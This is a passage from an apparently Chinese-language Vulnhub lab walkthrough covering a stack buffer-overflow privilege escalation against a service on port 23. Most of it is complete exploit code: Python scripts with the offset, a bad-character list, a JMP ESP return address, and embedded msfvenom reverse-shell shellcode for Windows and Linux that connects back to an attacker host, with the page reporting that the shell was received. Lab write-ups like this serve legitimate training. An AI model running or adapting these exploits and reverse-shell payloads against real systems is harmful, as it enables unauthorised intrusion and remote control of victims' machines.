+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x7a\x7b\x7c\x7d\x80\x81\x82\x83\x84\x85\x86</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>再次执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/17.webp alt=17></p><p>好了 坏字符就是 <code>\x00\x4d\x4f\x5f\x79\x7e\x7f</code> 了</p><h3 id=poc6py>poc6.py</h3><p><img src=https://www.vulnhub.cn/walkthrough/613/18.webp alt=18></p><p>这里</p><pre tabindex=0><code>!mona find -s &#34;\xff\xe4&#34; -m &#34;access.exe&#34;
+</code></pre><p>找到的位置太低，弃了，在</p><pre tabindex=0><code>!mona find -s &#34;\xff\xe4&#34; -m &#34;funcs_access.dll&#34;
+</code></pre><p><img src=https://www.vulnhub.cn/walkthrough/613/19.webp alt=19></p><p>找到 <code>625012D0</code> ，倒序后 <code>\xD0\x12\x50\x62</code></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#39;</span><span style=color:#cd5555>\xD0\x12\x50\x62</span><span style=color:#cd5555>&#39;</span>
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>buffer = <span style=color:#cd5555>&#34;C&#34;</span> * (<span style=color:#b452cd>2500</span>-<span style=color:#658b00>len</span>(buff) - <span style=color:#658b00>len</span>(eip))
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/613/20.webp alt=20></p><h3 id=poc7py>poc7.py</h3><h5 id=windows环境>windows环境</h5><p>生成shellcode</p><pre tabindex=0><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f c -b &#34;\x00\x4d\x4f\x5f\x79\x7e\x7f&#34; EXITFUNC=thread
+</code></pre><p>python脚本</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#39;</span><span style=color:#cd5555>\xD0\x12\x50\x62</span><span style=color:#cd5555>&#39;</span>
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>nops = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x90</span><span style=color:#cd5555>&#34;</span> * <span style=color:#b452cd>30</span> 
+</span></span><span style=display:flex><span>shellcode = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xd7\xd0\x36\x10\x83\xee\xfc\xe2\xf4\x2b\x38\xb4\x10\xd7\xd0</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x56\x99\x32\xe1\xf6\x74\x5c\x80\x06\x9b\x85\xdc\xbd\x42\xc3</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x5b\x44\x38\xd8\x67\x7c\x36\xe6\x2f\x9a\x2c\xb6\xac\x34\x3c</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xf7\x11\xf9\x1d\xd6\x17\xd4\xe2\x85\x87\xbd\x42\xc7\x5b\x7c</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x2c\x5c\x9c\x27\x68\x34\x98\x37\xc1\x86\x5b\x6f\x30\xd6\x03</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xbd\x59\xcf\x33\x0c\x59\x5c\xe4\xbd\x11\x01\xe1\xc9\xbc\x16</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x1f\x3b\x11\x10\xe8\xd6\x65\x21\xd3\x4b\xe8\xec\xad\x12\x65</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x33\x88\xbd\x48\xf3\xd1\xe5\x76\x5c\xdc\x7d\x9b\x8f\xcc\x37</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc3\x5c\xd4\xbd\x11\x07\x59\x72\x34\xf3\x8b\x6d\x71\x8e\x8a</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x67\xef\x37\x8f\x69\x4a\x5c\xc2\xdd\x9d\x8a\xb8\x05\x22\xd7</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xd0\x5e\x67\xa4\xe2\x69\x44\xbf\x9c\x41\x36\xd0\x2f\xe3\xa8</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x47\xd1\x36\x10\xfe\x14\x62\x40\xbf\xf9\xb6\x7b\xd7\x2f\xe3</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x40\x87\x80\x66\x50\x87\x90\x66\x78\x3d\xdf\xe9\xf0\x28\x05</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa1\x7a\xd2\xb8\x3c\x10\xd5\xdf\x5e\x12\xd7\xd1\x8a\x99\x31</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xba\x26\x46\x80\xb8\xaf\xb5\xa3\xb1\xc9\xc5\x52\x10\x42\x1c</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x28\x9e\x3e\x65\x3b\xb8\xc6\xa5\x75\x86\xc9\xc5\xbf\xb3\x5b</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x74\xd7\x59\xd5\x47\x80\x87\x07\xe6\xbd\xc2\x6f\x46\x35\x2d</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x50\xd7\x93\xf4\x0a\x11\xd6\x5d\x72\x34\xc7\x16\x36\x54\x83</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x80\x60\x46\x81\x96\x60\x5e\x81\x86\x65\x46\xbf\xa9\xfa\x2f</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x51\x2f\xe3\x99\x37\x9e\x60\x56\x28\xe0\x5e\x18\x50\xcd\x56</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xef\x02\x6b\xd6\x0d\xfd\xda\x5e\xb6\x42\x6d\xab\xef\x02\xec</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x30\x6c\xdd\x50\xcd\xf0\xa2\xd5\x8d\x57\xc4\xa2\x59\x7a\xd7</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x83\xc9\xc5</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip   + shellcode 
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/613/21.webp alt=21></p><p><img src=https://www.vulnhub.cn/walkthrough/613/22.webp alt=22></p><p>成功接收反弹</p><h5 id=linux环境>linux环境</h5><p>生成shellcode</p><pre tabindex=0><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f python -b &#34;\x00\x4d\x4f\x5f\x79\x7e\x7f&#34;
+</code></pre><p>python脚本</p><pre tabindex=0><code>#!/usr/bin/python2
+import socket
+import sys
+import os
+ip = &#34;10.0.2.110&#34;
+port = 23
+buff = &#34;A&#34;*1902
+eip = &#39;\xD0\x12\x50\x62&#39;
+#eip high memory
+nullByte = &#34;\x00&#34;
+nops = &#34;\x90&#34; * 30 
+buf =  b&#34;&#34;
+buf += b&#34;\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81&#34;
+buf += b&#34;\x76\x0e\xd0\xba\xdc\xd7\x83\xee\xfc\xe2\xf4\xe1\x61&#34;
+buf += b&#34;\x2b\x34\x83\xf9\x8f\xbd\xd2\x33\x3d\x67\xb6\x77\x5c&#34;
+buf += b&#34;\x44\x89\x0a\xe3\x1a\x50\xf3\xa5\x2e\xb8\xb0\xdc\xd5&#34;
+buf += b&#34;\xdf\xd2\xde\xd7\xd1\x06\x55\x36\x60\xdc\x8c\x86\x83&#34;
+buf += b&#34;\x09\xdf\x5e\x31\x77\x5c\x85\xb8\xd4\xf3\xa4\xb8\xd2&#34;
+buf += b&#34;\xf3\xf8\xb2\xd3\x55\x34\x82\xe9\x55\x36\x60\xb1\x11&#34;
+buf += b&#34;\x57&#34;
+shellcode = buf
+inputBuffer = buff + eip   + shellcode 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+s.send(inputBuffer)
+</code></pre><p><img src=https://www.vulnhub.cn/walkthrough/613/23.webp alt=23></p><hr width=100% id=EOF><p style=color:#777>最后修改于 2020-12-04</p></div></div><nav class=post-pagination><a class=newer-posts href=/walkthrough/624/>下回<br>Vulnhub 624 Y0USEF-1</a>
+<a class=older-posts href=/walkthrough/567/>上回<br>Vulnhub 567 BBS (CUTE) 1.0.2</a></nav><div class=post-comment-wrapper></div></div></div></div></div><div id=sideContainer class=side-container><a class="a-block nav-head false" href=https://www.vulnhub.cn><div class=nav-title>Vulnhub靶机教程</div><div class=nav-subtitle>Themed by Diary.</div></a><div class=nav-link-list><a class="a-block nav-link-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block nav-link-item false" href=/posts>Archive</a>
+<a class="a-block nav-link-item false" href=/categories>Categories</a>
+<a class="a-block nav-link-item false" href=/tags>Tags</a>
+<a class="a-block nav-link-item false" href=/index.xml>RSS Feed</a></div><div class=nav-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><div id=extraContainer class=extra-container><div class=toc-wrapper><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>web测试</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a380 class=nav-端口80>端口80</a></li></ul><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#poc1py class=nav-poc1py>poc1.py</a></li><li><a href=#poc2py class=nav-poc2py>poc2.py</a></li><li><a href=#poc3py class=nav-poc3py>poc3.py</a></li><li><a href=#poc4py class=nav-poc4py>poc4.py</a></li><li><a href=#poc5py class=nav-poc5py>poc5.py</a></li><li><a href=#poc6py class=nav-poc6py>poc6.py</a></li><li><a href=#poc7py class=nav-poc7py>poc7.py</a></li></ul></div></div></div><div class=pagination><a id=globalBackToTop class="pagination-action animated-visibility" href=#top :class="{ invisible: scrollY == 0 }"><i class="material-icons pagination-action-icon">keyboard_arrow_up</i></a>
+<a type=button class=pagination-action id=darkModeToggleButton><span class="material-icons pagination-action-icon" id=darkModeToggleIcon>dark_mode</span></a></div></div><div id=single-column-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><script src=/js/journal.js></script></body></html>
